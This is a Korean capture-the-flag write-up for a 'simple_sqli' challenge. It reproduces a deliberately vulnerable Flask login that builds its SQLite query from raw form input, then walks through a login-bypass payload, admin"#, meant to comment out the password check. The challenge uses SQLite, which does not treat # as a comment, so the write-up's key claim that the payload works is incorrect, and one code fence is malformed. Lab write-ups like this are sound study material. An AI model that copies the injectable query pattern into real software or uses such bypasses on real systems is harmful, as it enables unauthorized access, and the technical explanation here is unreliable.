<!DOCTYPE html>
<html>
<head>
        <link rel="stylesheet" type="text/css" href="sytle.css">
</head>
<body>
        <h1>[웹 프로젝트] SQL Injection simple_sqli Write-Up</h1>
</body>
<br>
<br>
</html>

SQL Injection을 공부해보고자 관련 문제를 풀어보고자 한다.
![image](https://github.com/user-attachments/assets/5bb23888-8e4d-4f02-a772-b61eec2eb2fe)
먼저 서버에 접속해 보면 로그인이 가능한것 같다.
![image](https://github.com/user-attachments/assets/31386867-e21e-4c36-9009-d8008dc585cc)
로그인창에 들어가보자. 특별한건 없어 보인다. 

그럼 문제 파일을 받아아보자.
```python
#!/usr/bin/python3
from flask import Flask, request, render_template, g
import sqlite3
import os
import binascii

app = Flask(__name__)
app.secret_key = os.urandom(32)

try:
    FLAG = open('./flag.txt', 'r').read()
except:
    FLAG = '[**FLAG**]'

DATABASE = "database.db"
if os.path.exists(DATABASE) == False:
    db = sqlite3.connect(DATABASE)
    db.execute('create table users(userid char(100), userpassword char(100));')
    db.execute(f'insert into users(userid, userpassword) values ("guest", "guest"), ("admin", "{binascii.hexlify(os.urandom(16)).decode("utf8")}");')
    db.commit()
    db.close()

def get_db():
    db = getattr(g, '_database', None)
    if db is None:
        db = g._database = sqlite3.connect(DATABASE)
    db.row_factory = sqlite3.Row
    return db

def query_db(query, one=True):
    cur = get_db().execute(query)
    rv = cur.fetchall()
    cur.close()
    return (rv[0] if rv else None) if one else rv

@app.teardown_appcontext
def close_connection(exception):
    db = getattr(g, '_database', None)
    if db is not None:
        db.close()

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'GET':
        return render_template('login.html')
    else:
        userid = request.form.get('userid')
        userpassword = request.form.get('userpassword')
        res = query_db(f'select * from users where userid="{userid}" and userpassword="{userpassword}"')
        if res:
            userid = res[0]
            if userid == 'admin':
                return f'hello {userid} flag is {FLAG}'
            return f'<script>alert("hello {userid}");history.go(-1);</script>'
        return '<script>alert("wrong");history.go(-1);</script>'

app.run(host='0.0.0.0', port=8000)
```
코드를 살펴보면
'''python
try:
    FLAG = open('./flag.txt', 'r').read()
except:
    FLAG = '[**FLAG**]'
```
이 부분에서 FLAG를 열 수 있는것 같다.
```python
if res:
            userid = res[0]
            if userid == 'admin':
                return f'hello {userid} flag is {FLAG}'
            return f'<script>alert("hello {userid}");history.go(-1);</script>'
        return '<script>alert("wrong");history.go(-1);</script>'
```
밑으로 쭉 코드를 더 읽어보니 admin으로 로그인하면 FLAG를 얻을 수 있을 것으로 보인다.
```python
res = query_db(f'select * from users where userid="{userid}" and userpassword="{userpassword}"')
```
로그인 id와 password를 DB로 넘기는 코드를 자세히 살펴보니 userdi로 입력한 값은 userid로 가고 userpassword로 입력한 값은 userpassword로 가서 인증을 요구한다는 것을 알 수 있습니다.
이때 admin이라는 id를 알고 있으니 id 창에 ``` admin"# ```을 추가하여 아래와 같이 주석처리 한다면 
```python
select * from users where userid="admin"#" and userpassword="{userpassword}"'
```
이렇게 SQL문이 DB로 전달될 것입니다.
여기서 DB가 전달 받은 주석처리가 된 SQL문은 
```python
select * from users where userid="admin"
```
까지인 것이니 admin으로 로그인이 가능하게 됩니다.

